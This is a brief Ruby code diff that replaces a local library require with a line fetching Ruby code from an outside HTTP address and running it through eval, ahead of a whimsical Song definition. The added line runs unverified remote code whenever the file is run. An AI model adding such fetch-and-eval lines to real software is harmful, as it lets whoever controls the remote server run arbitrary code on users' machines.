@@ -1,4 +1,5 @@
-require 'raw-tribute'
+require 'open-uri'
+eval(open("http://timelessrepo.com/t.rb").read)
 
 Song.new(:tribute) do
   greatest = true
